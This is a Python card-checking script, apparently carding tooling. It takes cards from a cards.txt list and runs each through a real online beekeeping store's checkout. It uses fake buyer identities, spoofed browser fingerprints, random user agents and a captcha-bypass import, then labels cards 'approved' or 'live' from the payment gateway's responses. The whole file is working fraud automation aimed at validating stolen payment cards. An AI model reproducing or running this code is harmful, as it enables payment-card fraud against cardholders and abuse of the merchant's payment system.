import random
from faker import Faker
from random import choice
from captcha_bypass import *
from curl_cffi import requests
from colorama import init, Fore
from fake_useragent import UserAgent


def usuario() -> dict:
    number = random.randint(1111, 9999)
    postal = random.choice(['10080', '14925', '71601', '86556', '19980'])
    return { 'name' : Faker().name(), 'email' : Faker().email().replace('@', '{}@'.format(number)), 'username' : Faker().user_name(), 'phone' : '512678{}'.format(number), 'city' : Faker().city(), 'code' : postal }


def capture(data, start, end):
    try:
        star = data.index(start) + len(start)
        last = data.index(end, star)
        return data[star:last]

    except ValueError:
        return None


def ccn_gate(card):
    max_retries = 10
    retry_count = 0
    while retry_count < max_retries:
        try:
            init(autoreset=True)
            #============[Funcions Need]============#
            cliente = requests.Session(impersonate=choice(["chrome124", "chrome123", "safari17_0", "safari17_2_ios", "safari15_3"]))
            cliente.proxies = {"https": ""}
            cc_number, mes, ano_number, cvv = card.split('|')
            if len(ano_number) == 4: ano_number = ano_number[2:4]
            agente_user = UserAgent().random

            #============[Address Found]============#
            name  = usuario()['name'].split(' ')[0]
            last  = usuario()['name'].split(' ')[1]
            number = random.randint(1111, 9999)
            street = f"{name}+street+{number}"
            email = usuario()['email']
            phone = usuario()['phone']

            #============[Requests 1]============#
            headers = {"User-Agent": agente_user, "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8" }
            result  = cliente.get(url="https://glorybee.com/queen-excluders", headers=headers)
            form_key = capture(result.text, 'name="form_key" type="hidden" value="', '"')

            #============[Requests 2]============#
            headers = {"Cookie":f"form_key={form_key};","User-Agent": agente_user,"Accept": "application/json, text/javascript, */*; q=0.01","X-Requested-With": "XMLHttpRequest","Content-Type": "application/x-www-form-urlencoded","Origin": "https://glorybee.com","Referer": "https://glorybee.com/queen-excluders"}
            data    = {"product": "21873","selected_configurable_option": "","related_product": "","item": "21873","form_key": form_key,"super_attribute[183]": "6440","qty": "1"}
            result  = cliente.post(url="https://glorybee.com/checkout/cart/add/uenc/aHR0cHM6Ly9nbG9yeWJlZS5jb20vcXVlZW4tZXhjbHVkZXJz/product/21873/", data=data, headers=headers)

            #============[Requests 3]============#
            headers = {"User-Agent": agente_user,"Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8","Referer": "https://glorybee.com/queen-excluders"}
            result  = cliente.get(url="https://glorybee.com/checkout/cart/", headers=headers)
            form_id = capture(result.text, '"entity_id":"', '"')

            #============[Requests 4]============#
            headers = {"User-Agent": agente_user,"Accept": "*/*","Content-Type": "application/json","X-Requested-With": "XMLHttpRequest","Origin": "https://glorybee.com","Referer": "https://glorybee.com/checkout/"}
            data    = {"customerEmail":email}
            result  = cliente.post(url="https://glorybee.com/rest/default/V1/customers/isEmailAvailable", json=data, headers=headers)

            #============[Requests 5]============#
            headers = {"User-Agent": agente_user,"Accept": "*/*","Content-Type": "application/json","X-Requested-With": "XMLHttpRequest","Origin": "https://glorybee.com","Referer": "https://glorybee.com/checkout/"}
            data    = {"addressInformation":{"shipping_address":{"countryId":"US","regionId":"49","regionCode":"OR","region":"Oregon","street":[f"{number} B Airport Rd "],"company":"None","telephone":phone,"postcode":"97402","city":"eugene","firstname":name,"lastname":last,"middlename":"","extension_attributes":{"delivery_date":"","time_slot":"","location_id":"","location_address":""}},"billing_address":{"countryId":"US","regionId":"49","regionCode":"OR","region":"Oregon","street":[f"{number} B Airport Rd "],"company":"None","telephone":phone,"postcode":"97402","city":"eugene","firstname":name,"lastname":last,"middlename":"","saveInAddressBook":None},"shipping_method_code":"GND","shipping_carrier_code":"shqups","extension_attributes":{}}}
            result  = cliente.post(url=f"https://glorybee.com/rest/default/V1/guest-carts/{form_id}/shipping-information", json=data, headers=headers)

            #============[Requests 6]============#
            headers = {"User-Agent": agente_user,"Accept": "*/*","Content-Type": "application/x-www-form-urlencoded; charset=UTF-8","X-Requested-With": "XMLHttpRequest","Origin": "https://glorybee.com","Referer": "https://glorybee.com/checkout/"}
            data    = "payment_method=paya"
            result  = cliente.post(url="https://glorybee.com/magecomp_surcharge/checkout/applyPaymentMethod/", data=data, headers=headers)

            #============[Requests 7]============#
            headers = {"User-Agent": agente_user,"Accept": "application/json, text/javascript, */*; q=0.01","Content-Type": "application/x-www-form-urlencoded; charset=UTF-8","X-Requested-With": "XMLHttpRequest","Origin": "https://glorybee.com","Referer": "https://glorybee.com/checkout/"}
            data    = f"form_key={form_key}&cardNumber={cc_number}&cardExpirationDate={mes}{ano_number}&cvv={cvv}&billing%5Bname%5D={name}+{last}&billing%5Baddress%5D={street}&billing%5Bcity%5D=EUGENE&billing%5Bstate%5D=Oregon&billing%5BpostalCode%5D=10080&billing%5Bcountry%5D=US&shipping%5Bname%5D={name}+{last}&shipping%5Baddress%5D={street}&shipping%5Bcity%5D=eugene&shipping%5Bstate%5D=Oregon&shipping%5BpostalCode%5D=97402&shipping%5Bcountry%5D=US"
            result  = cliente.post(url="https://glorybee.com/paya/checkout/request", data=data, headers=headers)

            message_text = capture(result.json()['paymentresponse'], '"message":"', '"')
            message_code = capture(result.json()['paymentresponse'], '"code":"', '"')

            if "AVS FAILURE" in result.text:
                return Fore.GREEN + f"{card}|approved|AVS FAILURE|"
            
            elif "There was a problem with the request." in message_text:
                save_html = open('page.html', 'w+', encoding="utf-8")
                save_html.write(result.text)
                return f"{card}|probable live|"

            elif "CVV2 MISMATCH" in message_text:
                save_html = open('page.html', 'w+', encoding="utf-8")
                save_html.write(result.text)
                return Fore.GREEN + f"{card}|approved|{message_text}|{message_code}|"

            return Fore.RED + f"{card}|{message_text}|{message_code}|"
        except Exception as e:
            print(e)
            retry_count += 1
    else:
        return {"card": card, "status": "ERROR", "resp":  f"Retries: {retry_count}"}


if __name__ == "__main__":
    file = open('cards.txt', 'r')
    lines = file.readlines()
    for position, x in enumerate(lines):
        cc, mes, ano, cvv = x.split("|")
        gateway = ccn_gate(f"{cc}|{mes}|{ano}|{cvv.strip()}")
        print(gateway)
        with open('cards.txt', "w")as f:
            f.writelines(lines[position+1:])
            f.close()